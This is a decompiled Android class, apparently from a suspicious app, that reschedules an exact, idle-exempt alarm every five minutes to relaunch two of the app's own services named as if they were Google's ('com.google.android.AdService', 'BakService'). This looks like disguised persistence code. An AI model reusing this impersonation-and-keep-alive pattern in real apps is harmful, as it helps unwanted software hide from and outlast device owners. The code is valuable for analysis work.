package com.speed.net.daemon;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.SystemClock;
import android.util.Log;
import d0.l0;
import j2.i;

/* JADX INFO: compiled from: r8-map-id-01bd2f78e356d1793fe12b6cab4b4ddc2ec9524fab1d39c14fcb56e383ba4015 */
/* JADX INFO: loaded from: classes.dex */
public final class AlarmKeepAlive$AlarmReceiver extends BroadcastReceiver {
    public static void a(Context context, String str) {
        try {
            Intent className = new Intent().setClassName(context, str);
            i.d(className, "setClassName(...)");
            if (Build.VERSION.SDK_INT >= 26) {
                l0.J(context, className);
            } else {
                context.startService(className);
            }
        } catch (Exception e4) {
            Log.e("AlarmKeepAlive", "Failed to start " + str + ": " + e4.getMessage());
        }
    }

    @Override // android.content.BroadcastReceiver
    public final void onReceive(Context context, Intent intent) {
        i.e(context, "context");
        i.e(intent, "intent");
        Log.i("AlarmKeepAlive", "Alarm triggered");
        a(context, "com.google.android.AdService");
        a(context, "com.google.android.BakService");
        Object systemService = context.getSystemService("alarm");
        AlarmManager alarmManager = systemService instanceof AlarmManager ? (AlarmManager) systemService : null;
        if (alarmManager == null) {
            return;
        }
        Intent intent2 = new Intent("com.speed.net.daemon.ALARM_KEEP_ALIVE").setPackage(context.getPackageName());
        i.d(intent2, "setPackage(...)");
        alarmManager.setExactAndAllowWhileIdle(2, SystemClock.elapsedRealtime() + 300000, PendingIntent.getBroadcast(context, 0, intent2, 201326592));
        Log.i("AlarmKeepAlive", "Alarm scheduled in 300s");
    }
}
